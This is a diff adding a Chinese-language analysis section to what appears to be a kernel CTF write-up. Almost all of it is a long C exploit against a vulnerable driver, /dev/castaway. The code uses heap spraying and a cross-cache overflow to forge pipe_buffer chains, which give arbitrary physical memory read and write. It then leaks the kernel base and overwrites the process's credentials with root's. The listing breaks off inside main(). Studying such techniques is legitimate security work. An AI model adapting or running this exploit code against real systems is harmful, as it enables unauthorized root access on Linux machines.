@@ -3969,10 +3969,1676 @@ sequenceDiagram
               height: auto;">
 </div>
 
+## 7. 进阶分析：Pipe Chain技术分析
+
+exploit核心代码如下：
+
+```c
+//======================================================================
+// KERNEL SYMBOLS & EXPLOIT CONFIGURATION
+//======================================================================
+
+// Static kernel symbol addresses for the target kernel image
+// Used to calculate runtime kernel base from leaked pointers
+#define ANON_PIPE_BUF_OPS                           0xffffffff8181ac00
+#ifdef SECONDARY_STARTUP_64
+#undef SECONDARY_STARTUP_64
+#endif
+#define SECONDARY_STARTUP_64                        0xffffffff81000040
+
+// Exploit behavior tuning - chunk sizing, spray counts, and limits
+#define CHUNK_SIZE                                  512
+#define ISO_SLAB_LIMIT                              8
+#define INITIAL_PAGE_SPRAY                          500
+#define FINAL_PAGE_SPRAY                            30
+#define MAX_PIPES                                   0x80
+#define PIPE_BUFFER_SIZE                            0x28
+
+//======================================================================
+// GLOBAL EXPLOIT STATE TRACKING
+//======================================================================
+
+int vuln_dev_fd;                                    // File descriptor for the vulnerable device
+int debug_enabled = 1;                              // Toggle verbose debug logging
+
+// Live task_struct addressing state during the exploit
+size_t current_task_addr;                           // Virtual address of current task_struct
+size_t current_task_page_addr;                      // Physical page holding current task_struct
+size_t parent_task_addr;                            // Virtual address of parent task_struct
+size_t root_task_addr;                              // Virtual address of root task_struct (swapper/init)
+size_t root_task_page_addr;                         // Physical page holding root task_struct
+size_t root_cred_addr;                              // Virtual address of root credentials
+size_t root_nsproxy_addr;                           // Virtual address of root namespace proxy
+
+// Active pipe array used for heap shaping and UAF control
+int pipe_fds[MAX_PIPES][2];                         // Pipe file descriptor pairs
+size_t pipe_buffer_data[0x1000];                    // Scratch buffer for pipe I/O operations
+char overflow_payload[0x1000];                      // Buffer for constructing overflow payloads
+
+// Corruption tracking indices for overlapping objects
+int first_overlap_pipe_index = -1;                  // First controlling pipe with slab overlap
+int first_victim_pipe_index = -1;                   // First victim pipe corrupted by overflow
+int second_overlap_pipe_index = -1;                 // Second controlling pipe with slab overlap
+int second_victim_pipe_index = -1;                  // Second victim pipe corrupted by overflow
+
+// Self-referential pipe indices forming the arbitrary R/W chain
+int self_second_pipe_index = -1;                    // Chain pipe #2 for arb R/W routing
+int self_third_pipe_index = -1;                     // Chain pipe #3 for arb R/W routing
+int self_fourth_pipe_index = -1;                    // Chain pipe #4 for arb R/W routing
+
+// Forged pipe_buffer structures for controlled memory access
+struct pipe_buffer primary_fake_pipe_buf = {0};     // Primary fake pipe_buffer for initial control
+struct pipe_buffer secondary_fake_pipe_buf = {0};   // Secondary fake pipe_buffer for chain setup
+struct pipe_buffer arb_read_pipe_buf = {0};         // Template pipe_buffer for arbitrary reads
+struct pipe_buffer arb_write_pipe_buf = {0};        // Template pipe_buffer for arbitrary writes
+
+//======================================================================
+// DRIVER INTERFACE STRUCTURES
+//======================================================================
+
+// IOCTL request format for the vulnerable driver
+struct user_req {
+    int64_t idx;                                    // Target chunk index for the operation
+    uint64_t size;                                  // Operation size in bytes
+    char *buf;                                      // User-space buffer pointer for data
+};
+
+// Tracking structure for isolated kmalloc slab pages
+struct isolated_slab_page {
+    bool in_use;                                    // Marks if this page is actively allocated
+    int chunk_indices[ISO_SLAB_LIMIT];              // Driver chunk indices living on this page
+};
+
+struct isolated_slab_page isolated_slab_pages[FINAL_PAGE_SPRAY] = {0};
+
+/*
+ * ============================================================================
+ * DEVICE INTERACTION PRIMITIVES
+ * ============================================================================
+ */
+
+// Allocate a single vulnerable chunk via driver IOCTL
+// Returns the chunk index assigned by the driver
+int64_t alloc_vuln_chunk(void) {
+    return ioctl(vuln_dev_fd, 0xCAFEBABE, 0);
+}
+
+// Modify the content of an existing vulnerable chunk via driver IOCTL
+// Takes chunk index, operation size, and source buffer
+int64_t edit_vuln_chunk(int64_t idx, uint64_t size, char *buf) {
+    struct user_req req = {.idx = idx, .size = size, .buf = buf};
+    return ioctl(vuln_dev_fd, 0xF00DBABE, (unsigned long)&req);
+}
+
+/*
+ * ============================================================================
+ * SLAB ISOLATION MANAGEMENT
+ * ============================================================================
+ */
+
+// Sequentially allocate and track vulnerable chunks to occupy a full slab page
+// Pages are tracked to enable targeted cross-cache overflow later
+void populate_isolated_slab_page(struct isolated_slab_page *pages, int page_idx) {
+    assert(page_idx < FINAL_PAGE_SPRAY);
+    assert(!pages[page_idx].in_use);
+
+    for (int i = 0; i < ISO_SLAB_LIMIT; i++) {
+        long result = alloc_vuln_chunk();
+        if (result < 0) {
+            log.error("Slab chunk allocation failed at page %d chunk %d", page_idx, i);
+            exit(EXIT_FAILURE);
+        }
+        pages[page_idx].chunk_indices[i] = result;
+    }
+    pages[page_idx].in_use = true;
+}
+
+// Spray identical data across all chunks residing on a specific isolated page
+// Used to deploy overflow payloads across contiguous slab allocations
+void modify_isolated_slab_page(struct isolated_slab_page *pages, int page_idx, uint8_t *buf, size_t sz) {
+    assert(page_idx < FINAL_PAGE_SPRAY);
+    assert(pages[page_idx].in_use);
+
+    for (int i = 0; i < ISO_SLAB_LIMIT; i++) {
+        long result = edit_vuln_chunk(pages[page_idx].chunk_indices[i], sz, buf);
+        if (result < 0) {
+            log.error("Slab chunk modification failed at page %d chunk %d", page_idx, i);
+            exit(EXIT_FAILURE);
+        }
+    }
+}
+
+/*
+ * ============================================================================
+ * PIPE INFRASTRUCTURE MANAGEMENT
+ * ============================================================================
+ */
+
+// Create a pipe and register its file descriptors in the global tracking array
+void create_pipe(int pipe_index) {
+    if (pipe(pipe_fds[pipe_index]) < 0) {
+        log.error("Pipe creation failed at index %d", pipe_index);
+        exit(EXIT_FAILURE);
+    }
+}
+
+// Dynamically resize pipe buffer capacity to influence underlying slab cache selection
+// Forces pipe buffers into specific kmalloc caches for controlled heap layout
+void resize_pipe_buffer(int pipe_index, int new_size) {
+    if (fcntl(pipe_fds[pipe_index][0], F_SETPIPE_SZ, new_size) < 0) {
+        log.error("Pipe resize failed for pipe %d to size 0x%x", pipe_index, new_size);
+        exit(EXIT_FAILURE);
+    }
+}
+
+/*
+ * ============================================================================
+ * RESOURCE CLEANUP
+ * ============================================================================
+ */
+
+// Release all acquired system resources including pipes and device handles
+// Critical for preventing resource leaks during exploit iteration
+void cleanup_resources(void) {
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if (pipe_fds[i][0] > 0) close(pipe_fds[i][0]);
+        if (pipe_fds[i][1] > 0) close(pipe_fds[i][1]);
+    }
+    if (vuln_dev_fd > 0) close(vuln_dev_fd);
+}
+
+/*
+ * ============================================================================
+ * ARBITRARY PHYSICAL MEMORY ACCESS PRIMITIVES
+ * ============================================================================
+ */
+
+// Configure interconnected pipe_buffer chain to enable arbitrary physical R/W
+// Chains multiple self-referential pipes to redirect memory accesses
+void configure_arbitrary_operations(void) {
+    debug_enabled = 0;
+
+    // Configure self_third_pipe->pipe_buffer to point into controlled region
+    secondary_fake_pipe_buf.offset = 512 * 3;
+    secondary_fake_pipe_buf.len = 0;
+    write(pipe_fds[self_second_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Configure self_fourth_pipe->pipe_buffer to point into controlled region
+    secondary_fake_pipe_buf.offset = 512;
+    secondary_fake_pipe_buf.len = 0;
+    write(pipe_fds[self_third_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Configure self_second_pipe->pipe_buffer to point into controlled region
+    secondary_fake_pipe_buf.offset = 0;
+    secondary_fake_pipe_buf.len = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Clear intermediate buffer space to align subsequent writes
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[self_fourth_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    // Finalize third pipe configuration to complete the chain
+    secondary_fake_pipe_buf.offset = 512 * 3;
+    secondary_fake_pipe_buf.len = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+}
+
+// Read arbitrary physical memory via forged pipe_buffer chain
+// Routes read operations through manipulated pipe buffers to target physical addresses
+void arbitrary_physical_read(uint64_t target_page, uint32_t page_offset, void *output_buffer, uint64_t read_length) {
+    debug_enabled = 0;
+
+    // Stage 1: Reset fourth pipe to known alignment state
+    arb_read_pipe_buf.offset = 512;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_third_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Stage 2: Redirect second pipe to target physical address
+    arb_read_pipe_buf.page = (struct page*)target_page;
+    arb_read_pipe_buf.offset = page_offset;
+    arb_read_pipe_buf.len = 0xfff;
+    write(pipe_fds[self_fourth_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Stage 3: Flush alignment padding to maintain pipe buffer layout
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[self_fourth_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    // Stage 4: Restore third pipe to safe state while preserving redirection
+    arb_read_pipe_buf.page = primary_fake_pipe_buf.page;
+    arb_read_pipe_buf.offset = 512 * 3;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Stage 5: Extract data via second pipe read operation
+    read(pipe_fds[self_second_pipe_index][0], output_buffer, read_length);
+}
+
+// Write arbitrary physical memory via forged pipe_buffer chain
+// Routes write operations through manipulated pipe buffers to target physical addresses
+void arbitrary_physical_write(uint64_t target_page, uint32_t page_offset, void *input_data, uint64_t write_length) {
+    debug_enabled = 0;
+
+    // Stage 1: Reset fourth pipe to known alignment state
+    arb_read_pipe_buf.offset = 512;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_third_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Stage 2: Redirect second pipe to target physical address
+    arb_read_pipe_buf.page = (struct page*)target_page;
+    arb_read_pipe_buf.offset = page_offset;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Stage 3: Flush alignment padding to maintain pipe buffer layout
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[self_fourth_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    // Stage 4: Restore third pipe to safe state while preserving redirection
+    arb_read_pipe_buf.page = primary_fake_pipe_buf.page;
+    arb_read_pipe_buf.offset = 512 * 3;
+    arb_read_pipe_buf.len = 0;
+    write(pipe_fds[self_fourth_pipe_index][1], &arb_read_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Stage 5: Inject data via second pipe write operation
+    write(pipe_fds[self_second_pipe_index][1], input_data, write_length);
+}
+
+/*
+ * ============================================================================
+ * KERNEL MEMORY DISCOVERY
+ * ============================================================================
+ */
+
+// Determine vmemmap_base by scanning physical memory for kernel text signature
+// Uses known secondary_startup_64 offset to validate candidate addresses
+void discover_vmemmap_base(void){
+    // Start scan from page-aligned address derived from leaked page pointer
+    vmemmap_base = (size_t)primary_fake_pipe_buf.page & 0xfffffffff0000000;
+    size_t round = 0;
+
+    for (round = 0; ;round++) {
+        size_t candidate_value[4] = {0};
+        arbitrary_physical_read((vmemmap_base + 0x2740), 0, candidate_value, 0x10);
+
+        // Verify candidate matches secondary_startup_64 signature and kernel base constraints
+        if (candidate_value[0] > kernel_base && ((candidate_value[0] & 0xfff) == (SECONDARY_STARTUP_64 & 0xfff))) {
+            log.success("[Round %lu] Located secondary_startup_64 signature in physmem, addr=0x%lx",
+                round, candidate_value[0]);
+            break;
+        }
+        vmemmap_base -= 0x10000000; // Step backward through physical memory regions
+    }
+    log.success("[Round %lu] Successfully mapped vmemmap_base address: 0x%lx", round, vmemmap_base);
+}
+
+// Scan physical memory to locate current and root task_struct instances
+// Identifies tasks by comm string patterns and validates surrounding task_struct fields
+void locate_task_structures(void) {
+    size_t round = 0;
+    int current_task_found = 0;
+    int root_task_found = 0;
+    char page_content_buffer[0x1000] = {0};
+    size_t *current_comm_ptr;
+    size_t *root_comm_ptr;
+
+    // Set unique process identifier for reliable memory scanning
+    prctl(PR_SET_NAME, "pwn4kernel");
+    log.info("Scanning physical memory pages to identify active task_struct instances...");
+
+    for (round = 0; ; round++) {
+        memset(page_content_buffer, 0, 0x1000);
+        arbitrary_physical_read((vmemmap_base + round * 0x40), 0, page_content_buffer, 0xf00);
+
+        current_comm_ptr = (size_t*)memmem(page_content_buffer, 0xf00, "pwn4kernel", 10);
+        root_comm_ptr = (size_t*)memmem(page_content_buffer, 0xf00, "swapper", 7);
+
+        // Validate current task_struct by checking critical field integrity
+        if (current_comm_ptr && (current_comm_ptr[-1] > 0xffff888000000000)      // cred validity
+            && (current_comm_ptr[-2] > 0xffff888000000000)                       // real_cred validity
+            && (current_comm_ptr[-55] > 0xffff888000000000)                      // real_parent validity
+            && (current_comm_ptr[-54] > 0xffff888000000000)) {                   // parent validity
+            current_task_found++;
+            parent_task_addr = current_comm_ptr[-55];                            // Capture parent pointer
+            // Derive task_struct address from ptraced field pointer
+            current_task_addr = current_comm_ptr[-48] - 0x328;
+            // Calculate page_offset_base from physical memory mapping
+            page_offset_base = (current_comm_ptr[-48] & 0xfffffffffffff000) - round * 0x1000;
+            page_offset_base &= 0xfffffffff0000000;
+
+            current_task_page_addr = (vmemmap_base + round * 0x40);
+            log.success("[Round %lu] Mapped current task_struct to phys page: 0x%lx", round, current_task_page_addr);
+            log.success("[Round %lu] Resolved page_offset_base mapping addr: 0x%lx", round, page_offset_base);
+            log.success("[Round %lu] Captured parent task_struct virt addr: 0x%lx", round, parent_task_addr);
+            log.success("[Round %lu] Resolved current task_struct virt addr: 0x%lx", round, current_task_addr);
+            if(current_task_found && root_task_found) break;
+        }
+
+        // Validate root task_struct (swapper) by field integrity
+        if (root_comm_ptr && (root_comm_ptr[-1] > 0xffff888000000000)            // cred validity
+            && (root_comm_ptr[-2] > 0xffff888000000000)                          // real_cred validity
+            && (root_comm_ptr[-55] > 0xffff888000000000)                         // real_parent validity
+            && (root_comm_ptr[-54] > 0xffff888000000000)) {                      // parent validity
+
+            if(root_task_found) continue;
+
+            root_task_found++;
+            root_cred_addr = root_comm_ptr[-2];                                  // Capture root cred pointer
+            root_task_addr = root_comm_ptr[-48] - 0x328;                         // Derive root task address
+            root_nsproxy_addr = root_comm_ptr[6];                                // Capture root nsproxy pointer
+            root_task_page_addr = (vmemmap_base + round * 0x40);
+            log.success("[Round %lu] Mapped root swapper task_struct to phys page: 0x%lx", round, root_task_page_addr);
+            log.success("[Round %lu] Resolved root task_struct virtual addr: 0x%lx", round, root_task_addr);
+            log.success("[Round %lu] Captured root credentials virt addr: 0x%lx", round, root_cred_addr);
+            log.success("[Round %lu] Resolved root nsproxy virt addr: 0x%lx", round, root_nsproxy_addr);
+            if(current_task_found && root_task_found) break;
+        }
+    }
+}
+
+/*
+ * ============================================================================
+ * PRIVILEGE ESCALATION
+ * ============================================================================
+ */
+
+// Overwrite current process credentials with root privileges via task_struct modification
+// Patches cred, real_cred, and nsproxy pointers to root equivalents in physical memory
+void escalate_privileges(void) {
+    size_t round = 0;
+    char task_copy_buffer[0x1000] = {0};
+    size_t *current_comm_field_ptr;
+
+    log.info("Modifying current task_struct credentials to gain root privileges...");
+
+    for (round = 0; ; round++) {
+        memset(task_copy_buffer, 0, 0x1000);
+        arbitrary_physical_read((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+        current_comm_field_ptr = (size_t*)memmem(task_copy_buffer, 0xf00, "pwn4kernel", 10);
+
+        // Validate task_struct integrity before modification
+        if (current_comm_field_ptr && (current_comm_field_ptr[-1] > 0xffff888000000000)
+            && (current_comm_field_ptr[-2] > 0xffff888000000000)
+            && (current_comm_field_ptr[-55] > 0xffff888000000000)
+            && (current_comm_field_ptr[-54] > 0xffff888000000000)) {
+            // Replace credential pointers with root equivalents
+            current_comm_field_ptr[-1] = root_cred_addr;         // Overwrite task->cred
+            current_comm_field_ptr[-2] = root_cred_addr;         // Overwrite task->real_cred
+            current_comm_field_ptr[6] = root_nsproxy_addr;       // Overwrite task->nsproxy
+
+            // Commit modified task_struct to physical memory
+            arbitrary_physical_write((current_task_page_addr + round * 0x40), 0, task_copy_buffer, 0xf00);
+
+            log.success("[Round %d] Credential patching complete at phys page: 0x%lx",
+                round, current_task_page_addr);
+            break;
+        }
+    }
+}
+
+/*
+ * ============================================================================
+ * EXPLOIT PHASE IMPLEMENTATIONS
+ * ============================================================================
+ */
+
+// Phase 1: Initialize exploit environment and driver interface
+// Sets up CPU affinity, saves execution state, and opens the vulnerable device
+void exploit_init(void) {
+    bind_core(0);
+    save_status();
+
+    log.info("Opening vulnerable character device /dev/castaway for exploitation...");
+    vuln_dev_fd = open("/dev/castaway", O_RDWR);
+    if (vuln_dev_fd < 0) {
+        log.error("Failed to access device - check module load status and permissions");
+        exit(EXIT_FAILURE);
+    }
+    log.success("Successfully initialized vulnerable device interface [fd: %d]", vuln_dev_fd);
+
+    log.info("Preparing page spraying infrastructure for heap manipulation phase...");
+    prepare_pgv_system();
+}
+
+// Phase 2: Shape heap memory layout for precise slab targeting
+// Sprays pipes and pages to create controlled fragmentation and object placement
+void heap_fengshui(void) {
+    log.info("Writing identification markers to pipe buffers for corruption detection...");
+    for (int i = 0; i < MAX_PIPES; i++) {
+        create_pipe(i);
+        pipe_buffer_data[0] = *(size_t*)"BinRacer";         // Leading magic value for validation
+        pipe_buffer_data[1] = i;                            // Pipe index identifier
+        pipe_buffer_data[192 / 8] = *(size_t*)"BinRacer";   // Trailing magic value for redundancy
+        pipe_buffer_data[(192 / 8) + 1] = i;                // Index verification marker
+        write(pipe_fds[i][1], pipe_buffer_data, 192 * 2);
+    }
+
+    log.info("Allocating %d order-0 socket pages to apply heap memory pressure...", INITIAL_PAGE_SPRAY);
+    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
+        if (alloc_page(i, 0x1000, 1) < 0) {
+            log.error("Page allocation failed at index %d during heap spraying", i);
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    log.info("Creating strategic memory fragmentation by freeing alternating pages...");
+    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+
+    log.info("Redirecting pipe buffers into freed memory regions via resize operations...");
+    for (int i = 0; i < MAX_PIPES; i++) resize_pipe_buffer(i, 0x1000 * 8);
+
+    log.info("Releasing alternate sprayed pages to isolate target kmalloc-512 slab page...");
+    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) free_page(i);
+    log.success("Completed heap layout engineering for cross-cache targeting");
+}
+
+// Phase 3-A: Execute cross-cache overflow against target slab
+// Occupies target slab pages and triggers overflow into adjacent cache
+void cross_cache_overflow(void) {
+    log.info("Occupying %d isolation pages with vulnerable driver kmalloc chunks...", FINAL_PAGE_SPRAY);
+    for (int i = 0; i < FINAL_PAGE_SPRAY; i++) {
+        populate_isolated_slab_page(isolated_slab_pages, i);
+    }
+    log.success("Target slab pages fully populated with vulnerable driver allocations");
+
+    log.info("Building cross-cache overflow payload with trailing null termination...");
+    memset(overflow_payload, 0, CHUNK_SIZE);
+    size_t null_address = 0x00;
+    memcpy(&overflow_payload[CHUNK_SIZE - 6], &null_address, 6);
+    modify_isolated_slab_page(isolated_slab_pages, 0, overflow_payload, CHUNK_SIZE - 5);
+    log.success("Cross-cache overflow payload deployed to target slab page");
+}
+
+// Phase 3-B: Identify corrupted pipe objects resulting from overflow
+// Scans pipe array for magic value corruption indicating successful slab overflow
+int find_corrupted_pipes(void) {
+    log.info("Inspecting pipe array for metadata corruption caused by overflow...");
+
+    for (int i = 0; i < MAX_PIPES; i++) {
+        memset(pipe_buffer_data, 0, 192);
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        // Detect magic value overwrite indicating successful cross-cache overflow
+        if (pipe_buffer_data[0] == 0x72656361526e6942 && pipe_buffer_data[1] != i) {
+            first_victim_pipe_index = pipe_buffer_data[1];
+            first_overlap_pipe_index = i;
+
+            if(debug_enabled) {
+                hex_dump("Corrupted pipe_buffer metadata dump:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+            }
+            log.success("Found corruption pair - Victim pipe: %d, Controller pipe: %d",
+                        first_victim_pipe_index, first_overlap_pipe_index);
+        }
+        // Consume residual pipe data to reset read pointers
+        read(pipe_fds[i][0], pipe_buffer_data, 192 - PIPE_BUFFER_SIZE);
+    }
+
+    if (first_overlap_pipe_index == -1) {
+        log.error("No pipe corruption detected - cross-cache overflow failed to land");
+        return -1;
+    }
+    return 0;
+}
+
+// Phase 3-C: Extract kernel metadata from corrupted pipe_buffer
+// Reads leaked kernel pointers from smashed pipe_buffer to establish runtime addresses
+void leak_kernel_meta(void) {
+    log.info("Reading kernel pointer metadata from corrupted pipe_buffer structure...");
+
+    // Release victim pipe to destabilize heap state and prevent interference
+    close(pipe_fds[first_victim_pipe_index][0]);
+    close(pipe_fds[first_victim_pipe_index][1]);
+
+    // Stabilize heap layout by adjusting surviving pipe buffer sizes
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if(i == first_victim_pipe_index || i == first_overlap_pipe_index) continue;
+        resize_pipe_buffer(i, 0x1000 * 4);
+    }
+
+    // Extract kernel pointers from overlapping pipe_buffer structure
+    memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+    read(pipe_fds[first_overlap_pipe_index][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+    struct pipe_buffer leaked_pipe_buf = {0};
+    leaked_pipe_buf.page = (struct page *)pipe_buffer_data[0];
+    leaked_pipe_buf.offset = (int)(pipe_buffer_data[1] & 0xFFFFFFFFUL);
+    leaked_pipe_buf.len = (int)(pipe_buffer_data[1]>>32);
+    leaked_pipe_buf.ops = (struct pipe_buf_operations *)pipe_buffer_data[2];
+    leaked_pipe_buf.flags = (int)(pipe_buffer_data[3] & 0xFFFFFFFFUL);
+    leaked_pipe_buf.private = pipe_buffer_data[4];
+
+    // Calculate kernel base using known static symbol offset
+    kernel_offset = pipe_buffer_data[2] - ANON_PIPE_BUF_OPS;
+    kernel_base += kernel_offset;
+
+    if(debug_enabled) {
+        hex_dump("Raw kernel pointer extraction from corrupted pipe_buffer:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+    }
+
+    log.success("Recovered pipe_buffer->page kernel pointer: 0x%lx", leaked_pipe_buf.page);
+    log.success("Recovered pipe_buffer->ops function pointer: 0x%lx", leaked_pipe_buf.ops);
+    log.success("Calculated runtime kernel base address: 0x%lx", kernel_base);
+    log.success("Resolved kernel ASLR offset delta: 0x%lx", kernel_offset);
+
+    // Construct primary forged pipe_buffer for controlled memory access
+    memset(&primary_fake_pipe_buf, 0, PIPE_BUFFER_SIZE);
+    memcpy(&primary_fake_pipe_buf, &leaked_pipe_buf, PIPE_BUFFER_SIZE);
+    primary_fake_pipe_buf.page = (struct page *)((uint64_t)(primary_fake_pipe_buf.page) & (~0xff));
+    write(pipe_fds[first_overlap_pipe_index][1], &primary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    if(debug_enabled) {
+        hex_dump("Primary forged pipe_buffer configuration:", (char *)&primary_fake_pipe_buf, PIPE_BUFFER_SIZE + 0x8);
+    }
+}
+
+// Phase 3-D: Build arbitrary physical R/W primitives via pipe chain
+// Establishes interconnected self-referential pipes for arbitrary memory operations
+int build_arb_primitive(void) {
+    log.info("Constructing arbitrary physical memory access pipeline via pipe chain...");
+
+    // Identify secondary corruption pair for additional control
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if(i == first_victim_pipe_index || i == first_overlap_pipe_index) continue;
+
+        memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        if (pipe_buffer_data[0] == 0x72656361526e6942 && pipe_buffer_data[1] != i) {
+            second_victim_pipe_index = pipe_buffer_data[1];
+            second_overlap_pipe_index = i;
+
+            if(debug_enabled) {
+                hex_dump("Secondary corruption metadata dump:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+            }
+            log.success("Located secondary corruption pair - Victim pipe: %d, Controller pipe: %d",
+                        second_victim_pipe_index, second_overlap_pipe_index);
+        }
+    }
+
+    if (second_overlap_pipe_index == -1) {
+        log.error("Secondary corruption not found - heap layout is unstable for chaining");
+        return -1;
+    }
+
+    // Release secondary victim pipe to simplify heap management
+    close(pipe_fds[second_victim_pipe_index][0]);
+    close(pipe_fds[second_victim_pipe_index][1]);
+
+    // Realign heap layout for stable chain construction
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if(i == first_victim_pipe_index || i == first_overlap_pipe_index ||
+           i == second_victim_pipe_index || i == second_overlap_pipe_index) continue;
+        resize_pipe_buffer(i, 0x1000 * 8);
+    }
+
+    // Initialize secondary forged pipe_buffer chain component
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[second_overlap_pipe_index][1], pipe_buffer_data, 512 - 192 * 2);
+
+    memset(&secondary_fake_pipe_buf, 0, PIPE_BUFFER_SIZE);
+    memcpy(&secondary_fake_pipe_buf, &primary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+    secondary_fake_pipe_buf.offset = 512;
+    secondary_fake_pipe_buf.len = 512;
+    memcpy(&arb_read_pipe_buf, &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+    memcpy(&arb_write_pipe_buf, &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    write(pipe_fds[second_overlap_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    if(debug_enabled) {
+        hex_dump("Secondary forged pipe_buffer state:", (char *)&secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+    }
+
+    // Identify self-referential pipe indices for arbitrary R/W chain construction
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if(i == first_victim_pipe_index || i == first_overlap_pipe_index ||
+           i == second_victim_pipe_index || i == second_overlap_pipe_index) continue;
+
+        memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        if (pipe_buffer_data[0] == (size_t)primary_fake_pipe_buf.page) {
+            self_second_pipe_index = i;
+            if(debug_enabled) {
+                hex_dump("Self-referential pipe #2 state:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+            }
+            log.success("Selected self-referential pipe for chain position #2: %d", self_second_pipe_index);
+        }
+    }
+
+    if (self_second_pipe_index == -1) return -1;
+
+    // Configure tertiary pipe linkage in the control chain
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[second_overlap_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    secondary_fake_pipe_buf.offset = 512;
+    secondary_fake_pipe_buf.len = 512;
+    write(pipe_fds[second_overlap_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Identify third control pipe for chain extension
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if(i == first_victim_pipe_index || i == first_overlap_pipe_index ||
+           i == second_victim_pipe_index || i == second_overlap_pipe_index ||
+           i == self_second_pipe_index) continue;
+
+        memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        if (pipe_buffer_data[0] == (size_t)primary_fake_pipe_buf.page) {
+            self_third_pipe_index = i;
+            if(debug_enabled) {
+                hex_dump("Self-referential pipe #3 state:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+            }
+            log.success("Selected self-referential pipe for chain position #3: %d", self_third_pipe_index);
+        }
+    }
+
+    if (self_third_pipe_index == -1) return -1;
+
+    // Configure final pipe linkage in the control chain
+    memset(pipe_buffer_data, 0, 512);
+    write(pipe_fds[second_overlap_pipe_index][1], pipe_buffer_data, 512 - PIPE_BUFFER_SIZE);
+
+    secondary_fake_pipe_buf.offset = 512;
+    secondary_fake_pipe_buf.len = 512;
+    write(pipe_fds[second_overlap_pipe_index][1], &secondary_fake_pipe_buf, PIPE_BUFFER_SIZE);
+
+    // Identify fourth control pipe to complete the chain
+    for (int i = 0; i < MAX_PIPES; i++) {
+        if(i == first_victim_pipe_index || i == first_overlap_pipe_index ||
+           i == second_victim_pipe_index || i == second_overlap_pipe_index ||
+           i == self_second_pipe_index || i == self_third_pipe_index) continue;
+
+        memset(pipe_buffer_data, 0, PIPE_BUFFER_SIZE);
+        read(pipe_fds[i][0], pipe_buffer_data, PIPE_BUFFER_SIZE);
+
+        if (pipe_buffer_data[0] == (size_t)primary_fake_pipe_buf.page) {
+            self_fourth_pipe_index = i;
+            if(debug_enabled) {
+                hex_dump("Self-referential pipe #4 state:", (char *)pipe_buffer_data, PIPE_BUFFER_SIZE + 0x8);
+            }
+            log.success("Selected self-referential pipe for chain position #4: %d", self_fourth_pipe_index);
+        }
+    }
+
+    if (self_fourth_pipe_index == -1) return -1;
+
+    // Finalize arbitrary operation pipeline by interconnecting all chain components
+    configure_arbitrary_operations();
+    return 0;
+}
+
+/*
+ * ============================================================================
+ * MAIN EXPLOIT CONTROLLER
+ * ============================================================================
+ */
+int main(int argc, char **argv) {
+    log.info("===========================================================");
+    log.info("           KERNEL CROSS-CACHE OVERFLOW EXPLOIT             ");
+    log.info("===========================================================");
+    puts("");
+
+    log.info("===========================================================");
